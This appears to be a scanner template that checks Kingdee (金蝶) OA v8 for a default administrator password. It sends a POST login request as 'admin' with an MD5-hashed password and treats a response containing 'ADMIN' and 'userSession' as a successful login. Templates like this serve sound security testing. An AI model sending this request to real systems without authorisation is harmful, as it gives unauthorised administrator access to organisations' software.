{
    "Name": "金蝶OA-v8-default-password",
    "Description": "金蝶OA-v8-default-password",
    "Product": "金蝶OA",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/inter/ajax.php?cmd=get_user_login_cmd",
        "Port":"",
        "Data":"{\"get_user_login_cmd\":{\"name\":\"admin\",\"password\":\"21232f297a57a5a743894a0e4a801fc3\"}}",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            {
            "Operation": "contains",
            "Key":"",
            "Value": "ADMIN"
            },
            {
                "Operation": "contains",
                "Key":"",
                "Value": "userSession"
                },
            {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
             }
        ]
        },
        "Next_decide":""
        }
            
    ]}